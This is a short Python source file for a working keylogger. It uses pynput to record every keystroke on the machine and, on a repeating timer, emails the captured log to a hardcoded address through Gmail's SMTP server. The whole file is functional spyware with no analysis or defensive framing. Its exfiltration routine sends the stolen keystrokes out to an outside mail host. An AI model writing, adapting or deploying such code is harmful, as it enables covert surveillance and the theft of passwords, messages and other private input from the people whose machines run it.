#!usr/bin/env python

import pynput.keyboard as pk
import threading
import smtplib


class Keylogger:

    def __init__(self, time_interval, email, password):
        self.email = email
        self.password = password
        self.time_interval = time_interval
        self.log = "Keylogger start\n"
        self.start()

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " (%s) " % key
        self.append_to_log(current_key)

    def report(self):
        self.send_mail()
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def send_mail(self):
        server = smtplib.SMTP("smtp.gmail.com", 587, )
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, "\n\n"+self.log)
        server.quit()

    def start(self):
        keyboard_listener = pk.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


keylogger = Keylogger(3600, 'email', 'password')
